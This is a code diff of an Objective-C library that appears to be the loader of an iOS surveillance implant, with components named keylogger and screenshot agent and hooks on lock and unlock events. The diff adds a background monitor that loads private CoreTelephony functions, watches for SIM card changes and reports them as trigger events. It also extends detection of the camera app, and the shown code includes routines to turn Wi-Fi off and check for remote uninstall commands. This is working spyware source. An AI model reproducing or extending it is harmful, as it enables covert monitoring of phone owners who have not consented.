@@ -37,11 +37,13 @@
 
 #import "ARMHooker.h"
 
+#define JSON_CONFIG
+
 #define CAMERA_APP    @"com.apple.camera"
 #define CAMERA_APP_40 @"com.apple.mobileslideshow"
 
 #define VERSION       0.6
-//#define DEBUG
+#define DEBUG_TMP
 
 #define swizzleMethod(c1, m1, c2, m2) do { \
 method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
@@ -65,6 +67,7 @@ static int clipboardFlag    = 0;
 static int scrFlag          = 0;
 static int appFlag          = 0;
 static int stdFlag          = 0;
+static int simFlag          = 0;
 
 static int gContextHasBeenSwitched = 0;
 
@@ -74,6 +77,8 @@ RCSIKeyLogger         *gLogger;
 
 FILE *mFD;
 standByStruct gStandByActions;
+
+BOOL triggerSimChangeAction(UInt32 aAction);
 
 BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
 {
@@ -168,8 +173,80 @@ static void TurnWifiOff(CFNotificationCenterRef center,
   [antani setWiFiEnabled: NO];
 }
 
+typedef char* (*CTSIMSupportCopyMobileSubscriberIdentity_t)();
+typedef NSString* (*CTSIMSupportGetSIMStatus_t)();
+NSString* kCTSIMSupportSIMStatusReady = @"kCTSIMSupportSIMStatusReady";
+NSString* kCTSIMSupportSIMStatusNotInserted = @"kCTSIMSupportSIMStatusNotInserted";
+
+CTSIMSupportCopyMobileSubscriberIdentity_t __CTSIMSupportCopyMobileSubscriberIdentity;
+CTSIMSupportGetSIMStatus_t __CTSIMSupportGetSIMStatus;
+#define CT_FRAMEWORK_PUBLIC  "/System/Library/Frameworks/CoreTelephony.framework/CoreTelephony"
+#define CT_FRAMEWORK_PRIVATE "/System/Library/PrivateFrameworks/CoreTelephony.framework/CoreTelephony"
 
 @implementation RCSILoader
+
+- (void)simChangeMonitor:(NSNumber*)actionid
+{
+  BOOL simStatusReady = TRUE;
+ 
+  NSString *simStatus = __CTSIMSupportGetSIMStatus();
+  
+  if (simStatus != nil && [simStatus compare: kCTSIMSupportSIMStatusReady] == NSOrderedSame)
+      simStatusReady = TRUE;
+  else
+    simStatusReady = FALSE;
+      
+  while (simFlag == 1) 
+  {
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    simStatus = __CTSIMSupportGetSIMStatus();
+  
+    if (simStatus != nil)
+      {      
+        if (simStatusReady == FALSE && [simStatus compare: kCTSIMSupportSIMStatusReady] == NSOrderedSame)
+          {
+#ifdef DEBUG_
+            NSLog(@"[DYLIB] %s: sim inserted triggering", __FUNCTION__);
+#endif
+            simStatusReady = TRUE;
+            triggerSimChangeAction([actionid intValue]);
+          }
+        else if (simStatusReady == TRUE && [simStatus compare: kCTSIMSupportSIMStatusNotInserted] == NSOrderedSame)
+          {
+#ifdef DEBUG_
+            NSLog(@"[DYLIB] %s: sim removed", __FUNCTION__);
+#endif
+            simStatusReady = FALSE;
+          }
+      }
+  
+    [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow:1]];
+    
+    [pool release];
+  }
+}
+
+- (void)startSimChangeMonitor:(NSNumber *)actionid
+{
+  void* base = dlopen(CT_FRAMEWORK_PUBLIC, RTLD_NOW);
+
+  if (base == NULL)
+    base = dlopen(CT_FRAMEWORK_PRIVATE, RTLD_NOW);
+
+  if (base == NULL)
+      return;
+      
+  __CTSIMSupportGetSIMStatus = (CTSIMSupportGetSIMStatus_t) dlsym(base, "CTSIMSupportGetSIMStatus");
+  __CTSIMSupportCopyMobileSubscriberIdentity = (CTSIMSupportCopyMobileSubscriberIdentity_t) 
+                                              dlsym(base, "CTSIMSupportCopyMobileSubscriberIdentity");
+                                              
+  if (__CTSIMSupportGetSIMStatus == NULL ||
+      __CTSIMSupportCopyMobileSubscriberIdentity == NULL)
+    return;
+    
+  [NSThread detachNewThreadSelector: @selector(simChangeMonitor:) toTarget:self withObject: actionid];
+}
 
 // For stanby Event
 - (BOOL)hookingStandByMethods
@@ -301,7 +378,7 @@ static void TurnWifiOff(CFNotificationCenterRef center,
 
       // Check for uninstall
       readData = [mSharedMemoryCommand readMemory: OFFT_UNINSTALL
-        fromComponent: COMP_AGENT]; 
+                                    fromComponent: COMP_AGENT]; 
       if (readData != nil)
         {
           NSString *libName, *libWithPathname; 
@@ -427,6 +504,36 @@ static void TurnWifiOff(CFNotificationCenterRef center,
             }
         }
 
+    // Check for events sim change
+    readData = [mSharedMemoryCommand readMemory: OFFT_SIMCHG
+                                  fromComponent: COMP_AGENT];
+    if (readData != nil)
+      {      
+        shMemCommand = (shMemoryCommand *)[readData bytes];
+        
+        if (simFlag == 0 && shMemCommand->command == AG_START)
+          {
+#ifdef DEBUG_
+            NSLog(@"[DYLIB] %s: startin sim monitor", __FUNCTION__);
+#endif
+            int simChangeAction = 0xFFFFFFFF;
+            memcpy(&simChangeAction, shMemCommand->commandData, sizeof(int));
+            NSNumber *act = [[NSNumber alloc] initWithInt: simChangeAction];
+            
+            simFlag = 1;
+          
+            [self startSimChangeMonitor: act];
+            
+            sleep(1);
+            
+            [act release];
+          }
+        else if (simFlag == 1 && shMemCommand->command == AG_STOP)
+          {   
+            simFlag = 0;
+          }
+      }
+      
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
 
       [innerPool release];
@@ -460,7 +567,7 @@ BOOL triggerCamera(UInt32 startStop)
   
   shMemoryHeader->status          = SHMEM_WRITTEN;
   shMemoryHeader->logID           = 0;
-  shMemoryHeader->agentID         = AGENT_CAM;
+  shMemoryHeader->agentID         = EVENT_CAMERA_APP;
   shMemoryHeader->direction       = D_TO_CORE;
   shMemoryHeader->commandType     = CM_LOG_DATA;
   shMemoryHeader->flag            = startStop;
@@ -481,6 +588,47 @@ BOOL triggerCamera(UInt32 startStop)
       NSLog(@"[DYLIB] %s: error triggering startStop", __FUNCTION__);
 #endif
       retVal=NO;
+    }
+  
+  [actionData release];
+  
+  [pool release];
+  
+  return retVal;
+}
+
+BOOL triggerSimChangeAction(UInt32 aAction)
+{
+  BOOL retVal = YES;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
+  
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->logID           = 0;
+  shMemoryHeader->agentID         = EVENT_SIM_CHANGE;
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  shMemoryHeader->flag            = aAction;
+  shMemoryHeader->commandDataSize = 0;
+  shMemoryHeader->timestamp       = 0;
+  
+  if ([mSharedMemoryLogging writeMemory: actionData 
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+    {
+#ifdef DEBUG_
+    NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
+#endif
+    }
+  else
+    {
+#ifdef DEBUG_ERRORS
+    NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
+#endif
+    retVal=NO;
     }
   
   [actionData release];
@@ -598,7 +746,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   triggerStanByAction(gStandByActions.actionOnLock);
   
-#ifdef DEBUG
+#ifdef DEBUG_TMP
   NSLog(@"[DYLIB] %s:  lockWithTypeHook called", __FUNCTION__);
 #endif
 }
@@ -608,7 +756,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   triggerStanByAction(gStandByActions.actionOnLock);
   
-#ifdef DEBUG
+#ifdef DEBUG_TMP
   NSLog(@"[DYLIB] %s: lockHook called", __FUNCTION__);
 #endif
 }
@@ -617,9 +765,10 @@ BOOL triggerStanByAction(UInt32 aAction)
 {
   [self unlockWithSoundHook:aBool alertDisplay:anID];
   
-  triggerStanByAction(gStandByActions.actionOnUnlock);
+  //XXX-
+  //triggerStanByAction(gStandByActions.actionOnUnlock);
   
-#ifdef DEBUG
+#ifdef DEBUG_TMP
   NSLog(@"[DYLIB] %s:  unlockWithSoundHook called", __FUNCTION__);
 #endif
 }
@@ -630,7 +779,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   triggerStanByAction(gStandByActions.actionOnUnlock);
   
-#ifdef DEBUG
+#ifdef DEBUG_TMP
   NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
 #endif
 }
@@ -641,7 +790,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   triggerStanByAction(gStandByActions.actionOnUnlock);
   
-#ifdef DEBUG
+#ifdef DEBUG_TMP
   NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
 #endif
 }
@@ -740,20 +889,18 @@ BOOL triggerStanByAction(UInt32 aAction)
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
           shMemCommand = (shMemoryCommand *)[readData bytes];
-
+          
           if (scrFlag == 0
               && shMemCommand->command == AG_START)
             {
-#ifdef DEBUG
-              NSLog(@"[DYLIB] %s: Started Screenshot Agent", __FUNCTION__);
-#endif
-
               scrFlag = 1;
 
               // XXX- try to release
               NSData *agentData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
                                                          length: shMemCommand->commandDataSize];
-
+#ifdef DEBUG_
+            NSLog(@"[DYLIB] %s: Started Screenshot Agent %@", __FUNCTION__, agentData);
+#endif
               agentConfiguration = [[NSMutableDictionary alloc] init];
 
               [agentConfiguration setObject: AGENT_START 
@@ -771,7 +918,7 @@ BOOL triggerStanByAction(UInt32 aAction)
             {
               scrFlag = 3;
             }
-
+            
           [readData release];
         }
 
@@ -910,6 +1057,7 @@ BOOL triggerStanByAction(UInt32 aAction)
       if (scrFlag == 1)
         {
           scrFlag = 2;
+    
           RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
 
           [NSThread detachNewThreadSelector: @selector(start)
@@ -1121,7 +1269,20 @@ BOOL triggerStanByAction(UInt32 aAction)
         }
 
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
-
+    
+#ifdef JSON_CONFIG  
+      RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
+      
+      // resetta scrFlag: il thread precedente di start
+      // e' finito: agente e' restartabile
+      if (scrFlag == 2 &&
+          shMemCommand->command == AG_START &&
+          [scrAgent isAlreadyRunning] == FALSE)
+        {
+        scrFlag = 0;
+        }
+#endif
+ 
       [innerPool release];
     }
   
@@ -1191,7 +1352,8 @@ BOOL triggerStanByAction(UInt32 aAction)
   [scrAgent setMContextHasBeenSwitched:APP_IN_FOREGROUND];
   
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
-  if ([execName compare: CAMERA_APP] == NSOrderedSame)
+  if ([execName compare: CAMERA_APP]    == NSOrderedSame ||
+      [execName compare: CAMERA_APP_40] == NSOrderedSame)
     {
       triggerCamera(1);
     }
@@ -1206,7 +1368,8 @@ BOOL triggerStanByAction(UInt32 aAction)
   [scrAgent setMContextHasBeenSwitched:APP_IN_BACKGROUND];
   
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
-  if ([execName compare: CAMERA_APP] == NSOrderedSame)
+  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
+      [execName compare: CAMERA_APP_40] == NSOrderedSame)
     {
       triggerCamera(2);
     }
@@ -1220,6 +1383,7 @@ BOOL triggerStanByAction(UInt32 aAction)
     {
       mMainThreadRunning = YES;
     }
+  return self;
 }
 
 @end
